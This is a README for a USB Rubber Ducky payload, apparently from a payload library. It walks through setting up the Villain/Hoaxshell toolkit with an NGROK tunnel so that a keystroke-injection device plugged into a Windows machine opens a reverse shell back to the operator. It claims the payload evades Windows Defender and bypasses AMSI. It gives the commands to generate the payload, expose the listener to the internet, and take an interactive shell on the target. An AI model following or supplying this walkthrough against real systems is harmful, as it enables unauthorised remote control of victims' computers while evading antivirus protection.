**Title: Hoaxshell via Villain Payload and NGROK Tunnel**

<p>Author: HackingMark<br>
OS: Windows<br>
Version: 1.0<br>
Requirements: DuckyScript 3.0, powershell, Linux Maschine with Villain, NGROK</p>

**What is Villain?**
#
*Villain is a Toolset to setup Payloads and Listener for Hoaxshell*
*Hoaxshell is actually undetected by Windows Defender and the Payload is optimized to bypass AMSITrigger*
*The Powershell Payload connects the target Machine back to the Hoaxshell Server, NGROK makes this Server reachable from the Internet. *
*That way you can catch your session from everywhere. Once your session is established, you can open an interactive shell.*



**How to use this Payload**

First clone Villain from Repo:
`git clone https://github.com/t3l3machus/Villain`
Then install Requirements:
`cd Villain`
`pip install -r ./requirements.txt`
Allow Villain to start:
`chmod +x ./Villain.py`
Fire it up:
`./Villain.py`
Generate a payload to get the session identifier:
`generate os=windows lhost=0.0.0.0 lport=8080`
![alt text](https://github.com/HackingMark/usbrubberducky-payloads/blob/master/payloads/library/remote_access/VillainShellviaNGROKTunnel/media/villain.png)

Establish NGROK Tunnel forwarding Traffic to our Hoaxshell Engine
`ngrok http 8080`
![alt text](https://github.com/HackingMark/usbrubberducky-payloads/blob/master/payloads/library/remote_access/VillainShellviaNGROKTunnel/media/ngrok1.png)
Leave this Window open
![alt text](https://github.com/HackingMark/usbrubberducky-payloads/blob/master/payloads/library/remote_access/VillainShellviaNGROKTunnel/media/ngrok2.png)

**Preparing the Payload:**
You need 2 Values from above: NGROK HTTPS Link and Session Identifier from Villain
Put it into the Payload then compile it to inject.bin and download.
![alt text](https://github.com/HackingMark/usbrubberducky-payloads/blob/master/payloads/library/remote_access/VillainShellviaNGROKTunnel/media/payloadstudio.png)

Copy your Inject.bin to your Ducky!

<p>Plug your Ducky into a Windows target.<br>
Achieve reverse shell.<br>
   open a shell with </p>
   `shell SESSION-ID`
